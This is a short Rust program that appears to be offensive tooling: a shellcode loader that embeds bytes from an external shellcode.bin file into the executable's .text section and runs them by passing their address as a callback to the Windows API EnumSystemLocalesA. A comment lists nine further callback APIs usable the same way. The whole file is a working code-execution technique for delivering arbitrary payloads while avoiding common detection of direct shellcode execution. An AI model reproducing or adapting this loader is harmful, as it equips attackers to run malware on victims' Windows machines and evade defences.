use std::mem::transmute;

use windows_sys::Win32::Globalization::EnumSystemLocalesA;

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE_BYTES.len();

#[unsafe(no_mangle)]
#[unsafe(link_section = ".text")]
static SHELLCODE: [u8; SHELLCODE_SIZE] = *include_bytes!("../shellcode.bin");

/*
Usable Callback Functions:
    1. EnumSystemLocalesA
    2. EnumSystemLocalesEx
    3. EnumDesktopsA
    4. EnumChildWindows
    5. EnumDateFormatsA
    6. EnumUILanguagesA
    7. EnumThreadWindows
    8. EnumTimeFormatsA
    9. EnumPropsExA

https://github.com/aahmad097/AlternativeShellcodeExec
*/

fn main() {
    let shellcode_ptr = SHELLCODE.as_ptr() as *const ();

    unsafe {
        EnumSystemLocalesA(transmute(shellcode_ptr), 0);
    }
}
